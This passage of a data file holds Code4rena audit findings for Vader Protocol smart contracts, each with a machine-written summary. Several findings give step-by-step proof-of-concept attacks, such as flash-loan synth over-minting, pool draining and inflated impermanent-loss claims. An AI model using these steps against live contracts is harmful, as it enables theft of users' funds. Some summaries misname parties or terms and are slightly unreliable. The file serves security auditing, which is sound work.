      "content": "_Submitted by pauliax, also found by TomFrenchBlockchain_\n\n#### Impact\n\nUnused slippage params.\nfunction `addLiquidity` in VaderRouter (both V1 and V2) do not use slippage parameters:\n\n```solidity\n uint256, // amountAMin = unused\n uint256, // amountBMin = unused\n```\n\nmaking it susceptible to sandwich attacks / MEV.\nFor a more detailed explanation, see: <https://github.com/code-423n4/2021-09-bvecvx-findings/issues/57>\n\n#### Recommended Mitigation Steps\n\nConsider paying some attention to the slippage to reduce possible manipulation attacks from mempool snipers.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/253#issuecomment-979186152):**\n > Slippage checks are impossible in the Thorchain CLP model.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/253#issuecomment-991471469):**\n > Taking as main over #1 as it is a more general issue, but refer to #1 for a more detailed description and justification for the severity rating.\n\n\n\n",
      "summary": "\nThis bug report deals with an issue related to the function addLiquidity in VaderRouter (both V1 and V2). The problem is that the function does not use slippage parameters which makes it vulnerable to sandwich attacks and MEV (Miner Extractable Value). This means that the system can be manipulated by mempool snipers. To fix this issue, it is recommended to pay attention to the slippage to reduce the possibility of manipulation attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/253",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain",
        "pauliax"
      ]
    },
    {
      "id": "1015",
      "title": "[H-30] Newly Registered Assets Skew Consultation Results",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `TwapOracle.consult()` function iterates over all token pairs which belong to either `VADER` or USDV\\` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.\n\nIf a new asset is added by first registering the token pair and aggregator, the consultation result for that token pair will remain skewed until the next update interval. This is due to the fact that the native asset amount will return `0` due to the default `price1Average` value being used. However, the Chainlink oracle will return a valid result. As a result, the query will be skewed in favour of `sumUSD` resulting in incorrect consultations.\n\nI'd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157>\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L314>\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L322-L369>\n\n#### Tools Used\n\nManual code review.\n\n#### Recommended Mitigation Steps\n\nConsider performing proper checks to ensure that if `pairData.price1Average._x == 0`, then the Chainlink aggregator is not queried and not added to `sumUSD`. Additionally, it may be useful to fix the current check to assert that the `pairData.price1Average.mul(1).decode144()` result is not `0`, found [here](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L129-L132). `require(sumNative != 0)` is used to assert this, however, this should be `require(pairData.price1Average.mul(1).decode144() != 0)` instead.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/249)**\n>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `TwapOracle.consult()` function of the VADER and USDV protocols. This function iterates over all token pairs which belong to either `VADER` or USDV` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. If a new asset is added by first registering the token pair and aggregator, the consultation result for that token pair will remain skewed until the next update interval. This is due to the fact that the native asset amount will return `0` due to the default `price1Average` value being used. As a result, the query will be skewed in favour of `sumUSD` resulting in incorrect consultations. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions, making it a high risk issue.\n\nThe recommended mitigation steps for this vulnerability include performing proper checks to ensure that if `pairData.price1Average._x == 0`, then the Chainlink aggregator is not queried and not added to `sumUSD`, as well as fixing the current check to assert that the `pairData.price1Average.mul(1).decode144()` result is not `0`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/249",
      "tags": [
        "Oracle"
      ],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1013",
      "title": "[H-28] Incorrect Price Consultation Results",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `TwapOracle.consult()` function iterates over all token pairs which belong to either `VADER` or USDV\\` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.\n\nLet's say we wanted to query the price of `USDV`, we would sum up any token pair where `USDV == pairData.token0`.\n\nThe sum consists of the following:\n\n*   Price of `USDV` denominated in terms of `token1` (`USDV/token1`).\n*   Price of token1 denominated in terms of `USD` (`token1/USD`).\n\nConsider the following example:\n\n*   `SUSHI` is the only registered token pair that exists alongside `USDV`.\n*   Hence, calculating `sumNative` gives us an exchange rate that is denominated as `USDV/SUSHI`.\n*   Similarly, `sumUSD` gives us the following denominated pair, `SUSHI/USD`.\n*   I'd expect the result to equal `sumUSD * token.decimals() * sumNative` which should give us a USDV/USD denominated result.\n\nHowever, the protocol calculates it as `(sumUSD * token.decimals()) / sumNative` which gives us a `SUSHI^2 / (USD*USDV)` denominated result. This seems incorrect.\n\nI'd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157>\n\nSimilar working implementation listed below:\n\n*   <https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L184-L211>\n*   <https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L291-L304>\n\n#### Tools Used\n\nManual code review.\n\n#### Recommended Mitigation Steps\n\nTo calculate the correct consultation of a given token, the result should return `sumUSD * token.decimals() * sumNative` instead to ensure the target token to consult is denominated in `USD` and contains the correct number of decimals.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/235#issuecomment-979182948):**\n > The description seems slightly incorrect as it uses a power where multiplication is performed but the general idea is correct.\n\n\n\n",
      "summary": "\nThis bug report is about the `TwapOracle.consult()` function in the 2021-11-vader project. This function is used to calculate the price of an asset based on UniswapV2 and Chainlink price data. The bug is that the protocol calculates the exchange rate incorrectly, resulting in false results. This can lead to issues in other parts of the protocol that rely on this data.\n\nThe bug is classified as high risk due to the false results it produces. To fix the issue, the result should be calculated as `sumUSD * token.decimals() * sumNative` instead. This would ensure the target token is denominated in USD and contains the correct number of decimals.\n\nThe bug was discovered through manual code review. Proof of concept code and similar working implementations are available in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/235",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1012",
      "title": "[H-27] Unrestricted vestFor",
      "impact": "HIGH",
      "content": "_Submitted by pauliax, also found by hack3r-0m_\n\n#### Impact\n\nAnyone can call function `vestFor` and block any user with a tiny amount of Vader. This function has no auth checks so a malicious actor can front-run legit `vestFor` calls with insignificant amounts. This function locks the user for 365 days and does not allow updating the value, thus forbids legit conversions.\n\n#### Recommended Mitigation Steps\n\nConsider introducing a whitelist of callers that can vest on behalf of others (e.g. Converter).\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/229)**\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the function vestFor, which allows anyone to block any user with a tiny amount of Vader. This function has no authentication checks, meaning that malicious actors can use it to front-run legitimate vestFor calls. The result of this vulnerability is that users can be locked out for 365 days, preventing them from converting their tokens. \n\nThe recommended mitigation step is to introduce a whitelist of callers that can vest on behalf of others, such as Converter. This would allow legitimate users to convert their tokens while preventing malicious actors from taking advantage of the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/229",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "pauliax"
      ]
    },
    {
      "id": "1011",
      "title": "[H-26] All user assets which are approved to VaderPoolV2 may be stolen",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain, also found by cmichel_\n\n#### Impact\n\nTotal loss of funds which have been approved on `VaderPoolV2`\n\n#### Proof of Concept\n\n`VaderPoolV2` allows minting of fungible LP tokens with the `mintFungible` function\n\n<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L290>\n\nCrucially this function allows a user supplied value for `from` which specifies where the `nativeAsset` and `foreignAsset` should be pulled from. An attacker can then provide any address which has a token approval onto `VaderPoolV2` and mint themselves LP tokens - stealing the underlying tokens.\n\n#### Recommended Mitigation Steps\n\nRemove `from` argument and use msg.sender instead.\n\n**[SamSteinGG (Vader) disputed)](https://github.com/code-423n4/2021-11-vader-findings/issues/221#issuecomment-979180340):**\n > pool is not meant to be interacted with\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/221#issuecomment-991472193):**\n > And how are you going to ensure that the pool is not interacted with, @SamSteinGG?\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/221#issuecomment-995709116):**\n > @alcueca Upon second consideration, the functions relating to the minting of synths and wrapped tokens should have had the onlyRouter modifier and thus are indeed vulnerable. Issue accepted.\n>\n\n\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the `VaderPoolV2` smart contract which allows an attacker to mint fungible LP tokens and steal the underlying tokens. This is possible because the `mintFungible` function allows a user supplied value for `from` which specifies where the `nativeAsset` and `foreignAsset` should be pulled from. The recommended mitigation step is to remove the `from` argument and use `msg.sender` instead. This would ensure that the underlying tokens are not stolen.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/221",
      "tags": [
        "Business Logic",
        "Allowance"
      ],
      "finders": [
        "cmichel",
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1010",
      "title": "[H-25] Wrong design of swap() results in unexpected and unfavorable outputs",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nThe current formula to calculate the `amountOut` for a swap is:\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/math/VaderMath.sol#L99-L111\n\n```solidity=99\nfunction calculateSwap(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n) public pure returns (uint256 amountOut) {\n    // x * Y * X\n    uint256 numerator = amountIn * reserveIn * reserveOut;\n\n    // (x + X) ^ 2\n    uint256 denominator = pow(amountIn + reserveIn);\n\n    amountOut = numerator / denominator;\n}\n```\n\nWe believe the design (the formula) is wrong and it will result in unexpected and unfavorable outputs.\n\nSpecifically, if the `amountIn` is larger than the `reserveIn`, the `amountOut` starts to decrease.\n\n### PoC\n\nGiven:\n\n- A USDV-BTC Vader pool with the reserves of `200,000 USDV` and `2 BTC`.\n\n1. If Alice swap `2 BTC` for USDV, will get `50000 USDV` as output;\n2. If Bob swap `2.1 BTC` for USDV, will only get `49970.25 USDV` as output;\n3. If Carol swap `2.2 BTC` for USDV, will only get `49886.62 USDV` as output.\n\nFor the same pool reserves, paying more for less output token is unexpected and unfavorable.",
      "summary": "\nThe bug report is about an issue found in the formula used to calculate the amountOut for a swap. The formula is found in the VaderMath.sol file on GitHub. The bug is that if the amountIn is larger than the reserveIn, the amountOut starts to decrease. This can be seen in a PoC (Proof of Concept) given in the report, where a USDV-BTC Vader pool with the reserves of 200,000 USDV and 2 BTC is used. If Alice swaps 2 BTC for USDV, she will get 50000 USDV as output. However, if Bob or Carol swap 2.1 or 2.2 BTC for USDV, they will only get 49970.25 and 49886.62 USDV respectively as output. This is unexpected and unfavorable, as they are paying more for less output token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/213",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1009",
      "title": "[H-24] Wrong design/implementation of addLiquidity() allows attacker to steal funds from the liquidity pool",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nThe current design/implementation of Vader pool allows users to `addLiquidity` using arbitrary amounts instead of a fixed ratio of amounts in comparison to Uni v2.\n\nWe believe this design is flawed and it essentially allows anyone to manipulate the price of the pool easily and create an arbitrage opportunity at the cost of all other liquidity providers.\n\nAn attacker can exploit this by adding liquidity in extreme amounts and drain the funds from the pool.\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335\n\n```solidity=284\nfunction mintFungible(\n    IERC20 foreignAsset,\n    uint256 nativeDeposit,\n    uint256 foreignDeposit,\n    address from,\n    address to\n) external override nonReentrant returns (uint256 liquidity) {\n    IERC20Extended lp = wrapper.tokens(foreignAsset);\n\n    require(\n        lp != IERC20Extended(_ZERO_ADDRESS),\n        \"VaderPoolV2::mintFungible: Unsupported Token\"\n    );\n\n    (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(\n        foreignAsset\n    ); // gas savings\n\n    nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);\n    foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);\n\n    PairInfo storage pair = pairInfo[foreignAsset];\n    uint256 totalLiquidityUnits = pair.totalSupply;\n    if (totalLiquidityUnits == 0) liquidity = nativeDeposit;\n    else\n        liquidity = VaderMath.calculateLiquidityUnits(\n            nativeDeposit,\n            reserveNative,\n            foreignDeposit,\n            reserveForeign,\n            totalLiquidityUnits\n        );\n\n    require(\n        liquidity > 0,\n        \"VaderPoolV2::mintFungible: Insufficient Liquidity Provided\"\n    );\n\n    pair.totalSupply = totalLiquidityUnits + liquidity;\n\n    _update(\n        foreignAsset,\n        reserveNative + nativeDeposit,\n        reserveForeign + foreignDeposit,\n        reserveNative,\n        reserveForeign\n    );\n\n    lp.mint(to, liquidity);\n\n    emit Mint(from, to, nativeDeposit, foreignDeposit);\n}\n```\n\n### PoC\n\nGiven:\n\n- A Vader pool with `100,000 USDV` and `1 BTC`;\n- The `totalPoolUnits` is `100`.\n\nThe attacker can do the following in one transaction:\n\n1. Add liquidity with `100,000 USDV` and 0 BTC, get `50 liquidityUnits`, representing 1/3 shares of the pool;\n2. Swap `0.1 BTC` to USDV, repeat for 5 times; spent`0.5 BTC` and got `62163.36 USDV`;\n3. Remove liquidity, get back `45945.54 USDV` and `0.5 BTC`; profit for: 62163.36 + 45945.54 - 100000 = 8108.9 USDV.",
      "summary": "\nThis bug report is about a vulnerability in the current design/implementation of Vader pool which allows users to add liquidity using arbitrary amounts instead of a fixed ratio of amounts in comparison to Uni v2. This design flaw allows anyone to manipulate the price of the pool easily and create an arbitrage opportunity at the cost of all other liquidity providers. An attacker can exploit this by adding liquidity in extreme amounts and draining the funds from the pool.\n\nA proof of concept (PoC) provided in the report explains how an attacker can do this in one transaction. The PoC states that if a Vader pool has 100,000 USDV and 1 BTC with a totalPoolUnits of 100, the attacker can add liquidity with 100,000 USDV and 0 BTC, get 50 liquidityUnits, representing 1/3 shares of the pool; swap 0.1 BTC to USDV, repeat for 5 times; spent 0.5 BTC and got 62163.36 USDV; remove liquidity, get back 45945.54 USDV and 0.5 BTC; and profit for 8108.9 USDV.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/212",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1008",
      "title": "[H-23] Synth tokens can get over-minted",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nPer the document:\n\n> It also is capable of using liquidity units as collateral for synthetic assets, of which it will always have guaranteed redemption liquidity for.\n\nHowever, in the current implementation, `Synth` tokens are minted based on the calculation result. While `nativeDeposit` be added to the reserve, `reserveForeign` will remain unchanged, not deducted nor locked.\n\nMaking it possible for `Synth` tokens to get over-minted.\n\n### PoC\n\n- The Vader pool for BTC-USDV is newly created, with nearly 0 liquidity.\n\n1. Alice add liquidity with `100,000 USDV` and `1 BTC`;\n2. Bob `mintSynth()` with `100,000 USDV`, got `0.25 BTC vSynth`;\n3. Alice remove all the liquidity received at step 1, got all the `200k USDV` and `1 BTC`.\n\nThe `0.25 BTC vSynth` held by Bob is now backed by nothing and unable to be redeemed.\n\nThis also makes it possible for a sophisticated attacker to steal funds from the Vader pool.\n\nThe attacker may do the following in one transaction:\n\n1. Add liquidity with `10 USDV` and `10,000 BTC` (flash loan);\n2. Call `mintSynth()` with `10 USDV`, repeat for 10 times, got `1461 BTC vSynth`;\n3. Remove liquidity and repay flash loan, keep the `1461 BTC vSynth`;\n4. Wait for other users to add liquidity and when the BTC reserve is sufficient, call `burnSynth()` to steal `USDV` from the pool.",
      "summary": "\nA bug was reported in the WatchPug system that allows for over-minting of Synth tokens. This means that users are able to mint Synth tokens without the system deducting or locking the reserveForeign. This could lead to Synth tokens being backed by nothing and unable to be redeemed. This bug could also be used by a sophisticated attacker to steal funds from the Vader pool. The attacker could use a flash loan to add liquidity with 10 USDV and 10,000 BTC, call mintSynth() with 10 USDV 10 times, remove liquidity and repay the flash loan, and then wait for other users to add liquidity and call burnSynth() to steal USDV from the pool.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/210",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1007",
      "title": "[H-22] mintSynth() and burnSynth() can be front run",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L155\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L179-L197\n\nGiven that `mintSynth()` and `burnSynth()` will issue and redeem assets based on the price of the pool (reserves), and they will create price impact based on the volume being minted and burnt.\n\nHowever, the current implementation provides no parameter for slippage control, making them vulnerable to front-run attacks. Especially for transactions with rather large volumes.\n\n### Recommendation\n\nConsider adding a `minAmountOut` parameter.",
      "summary": "\nThis bug report is about the vulnerability of the WatchPug system. It is related to the `mintSynth()` and `burnSynth()` functions, which issue and redeem assets based on the price of the pool. The problem is that the current implementation does not provide any parameter for slippage control, making them vulnerable to front-run attacks. To address this issue, the report recommends adding a `minAmountOut` parameter. This will help to prevent front-run attacks by ensuring that the transaction has enough liquidity to execute without significantly impacting the price of the asset.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/209",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1006",
      "title": "[H-21] Lack of access control allow attacker to mintFungible() and mintSynth() with other user’s wallet balance",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335\n\n```solidity=284\nfunction mintFungible(\n        IERC20 foreignAsset,\n        uint256 nativeDeposit,\n        uint256 foreignDeposit,\n        address from,\n        address to\n    ) external override nonReentrant returns (uint256 liquidity) {\n        IERC20Extended lp = wrapper.tokens(foreignAsset);\n\n        require(\n            lp != IERC20Extended(_ZERO_ADDRESS),\n            \"VaderPoolV2::mintFungible: Unsupported Token\"\n        );\n\n        (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(\n            foreignAsset\n        ); // gas savings\n\n        nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);\n        foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);\n\n        PairInfo storage pair = pairInfo[foreignAsset];\n        uint256 totalLiquidityUnits = pair.totalSupply;\n        if (totalLiquidityUnits == 0) liquidity = nativeDeposit;\n        else\n            liquidity = VaderMath.calculateLiquidityUnits(\n                nativeDeposit,\n                reserveNative,\n                foreignDeposit,\n                reserveForeign,\n                totalLiquidityUnits\n            );\n\n        require(\n            liquidity > 0,\n            \"VaderPoolV2::mintFungible: Insufficient Liquidity Provided\"\n        );\n\n        pair.totalSupply = totalLiquidityUnits + liquidity;\n\n        _update(\n            foreignAsset,\n            reserveNative + nativeDeposit,\n            reserveForeign + foreignDeposit,\n            reserveNative,\n            reserveForeign\n        );\n\n        lp.mint(to, liquidity);\n\n        emit Mint(from, to, nativeDeposit, foreignDeposit);\n    }\n```\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167\n\nFunds are transferred from the `from` parameter, and the output tokens are transferred to the `to` parameter, both passed by the caller without proper access control.\n\n### Impact\n\nThis issue allows anyone to call `mintFungible()` and `mintSynth()` and steal almost all their wallet balances for all the users who have approved the contract before.",
      "summary": "\nThis bug report is about the WatchPug vulnerability in the code-423n4/2021-11-vader repository. It is found in the files VaderPoolV2.sol between lines 284 and 335. The issue is that funds are transferred from the 'from' parameter, and the output tokens are transferred to the 'to' parameter, both passed by the caller without proper access control. This means that anyone can call 'mintFungible()' and 'mintSynth()' and steal almost all their wallet balances from any user who has approved the contract before.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/204",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1005",
      "title": "[H-20] Early user can break addLiquidity",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/pool/BasePool.sol#L161-L163\n\n```solidity\nuint256 totalLiquidityUnits = totalSupply;\nif (totalLiquidityUnits == 0)\n    liquidity = nativeDeposit; // TODO: Contact ThorChain on proper approach\n```\n\nIn the current implementation, the first `liquidity` takes the `nativeDeposit` amount and uses it directly.\n\nHowever, since this number (`totalLiquidityUnits`) will later be used for computing the `liquidity` issued for future `addLiquidity` using `calculateLiquidityUnits`.\n\nA malicious user can add liquidity with only `1 wei` USDV and making it nearly impossible for future users to add liquidity to the pool.\n\n### Recomandation\n\nUni v2 solved this problem by sending the first 1000 tokens to the zero address.\n\nThe same should work here, i.e., on first mint (totalLiquidityUnits == 0), lock some of the first minter's tokens by minting ~1% of the initial amount to the zero address instead of to the first minter.",
      "summary": "\nThis bug report is about a vulnerability found in the BasePool.sol contract on the WatchPug Github repository. The vulnerability is that when a user adds liquidity with only 1 wei USDV, it makes it nearly impossible for future users to add liquidity to the pool. The recommendation is to use the same solution as Uni v2, which is to mint about 1% of the initial amount to the zero address instead of to the first minter when totalLiquidityUnits is equal to 0. This will prevent malicious users from taking advantage of the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/189",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1004",
      "title": "[H-19] Governance veto can be bypassed",
      "impact": "HIGH",
      "content": "_Submitted by gzeon_\n\n#### Impact\n\nSince `veto` ensure none of the actions in proposal being vetoed point to the contract (GovernorAlpha.sol:L562), a malicious proposal can be designed to have an action that point to governance and therefore effectively cannot be vetoed.\n\n#### Proof of Concept\n\nFor any attacker who want to launch a governance attack using a malicious proposal, they simply need to add an action that point to governance that does nothing (or anything).\n\n#### Recommended Mitigation Steps\n\nSome other design can be proposal are vetoable whenever the differential is less than x%, even if it involves governance change, s.t. council can veto most malicious proposal while it is still possible to change council given high enough vote differential.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/186#issuecomment-974605886):**\n > Duplicate of #61\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/186#issuecomment-991037314):**\n > Not a duplicate\n\n\n\n",
      "summary": "\nThis bug report is regarding a vulnerability in the GovernorAlpha.sol contract which can be exploited to launch a governance attack. The vulnerability exists because the veto function (GovernorAlpha.sol:L562) does not allow any of the actions in the proposal to point to the contract. This means that a malicious proposal can be designed with an action that points to the governance, which cannot be vetoed. An attacker can use this vulnerability to launch a governance attack by adding an action that points to governance that does nothing or anything. \n\nTo mitigate this vulnerability, it is recommended that a design be implemented in which proposals are vetoable whenever the differential is less than a certain percentage, even if it involves a governance change. This way, the council can veto most malicious proposals, while still allowing the council to change with a high enough vote differential.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/186",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1003",
      "title": "[H-18] Attacker can claim more IL by manipulating pool price then removeLiquidity ",
      "impact": "HIGH",
      "content": "## Handle\n\ngzeon\n\n\n## Vulnerability details\n\n## Impact\nVader reimburse user IL immediately when user withdraw from the pool (VaderRouterV2.sol:L227), an attacker can therefore manipulate the pool balance causing a high IL, remove liquidity and restore the pool balance such that he will receive a larger IL reimbursement.\n\n## Proof of Concept\nLet's assume our attacker own 100% of FOO-VADER\n1) Attacker add 100 FOO and 100 VADER to the Pool\n2) wait some block, or 1 year for max IL protection\n3) In 1 transaction, attacker\n    - Swap 9900 FOO to 99 Vader\n    - Pool now have 10000 FOO and 1 VADER\n    - By VaderMath.sol:L84 the loss is 100*1/10000+100-2 = 98.01 VADER\n    - Remove liquidity and receive 10000 FOO and 99.01 VADER\n    - Restore the pool balance\n4) Such that the attacker will gain 98.01 VADER without risk\n\nThe profit is constrained by gas cost, pool fee, % of pool controlled by the attacker and % of IL protection.\n\n## Recommended Mitigation Steps\nUse twap price to determine P1 in VaderMath.sol:L84 when calculating IL to reduce risk of manipulation",
      "summary": "\nThis bug report is about a vulnerability in the VaderRouterV2.sol contract, which allows an attacker to manipulate the pool balance and receive a larger reimbursement of IL (illiquidity protection) than they should. The attacker can do this by adding 100 FOO and 100 VADER to the pool, then swapping 9900 FOO to 99 VADER. This leaves the pool with 10000 FOO and 1 VADER, and the attacker would receive 98.01 VADER as a reimbursement, without any risk. The amount of profit gained is constrained by gas cost, pool fee, the percentage of the pool controlled by the attacker, and the percentage of IL protection. \n\nThe recommended mitigation step for this vulnerability is to use twap price to determine P1 in VaderMath.sol:L84 when calculating IL, in order to reduce the risk of manipulation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/182",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1002",
      "title": "[H-17] TWAPOracle might register with wrong token order",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe `TWAPOracle.registerPair` function takes in a `factory` and (`token0, token1)`.\nThe function accepts a `_factory` argument which means any Uniswap-like factory can be used.\n\nWhen using the actual Uniswap factory's `IUniswapV2Factory(factory).getPair(token0, token1)` call, it could be that the `token0` and `token1` are reversed as it [ignores the order](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Factory.sol#L35).\n\nMeaning, the `price0/1CumulativeLast` could also be reversed as it matches the internal order.\nThe code however pushes the `_pairs` assuming that the internal `price0CumulativeLast, price1CumulativeLast` order matches the order of the function arguments `token0, token1`.\n\n```solidity\n_pairs.push(\n    PairData({\n        pair: pairAddr,\n        token0: token0,\n        token1: token1,\n        price0CumulativeLast: price0CumulativeLast,\n        price1CumulativeLast: price1CumulativeLast,\n        blockTimestampLast: blockTimestampLast,\n        price0Average: FixedPoint.uq112x112({_x: 0}),\n        price1Average: FixedPoint.uq112x112({_x: 0})\n    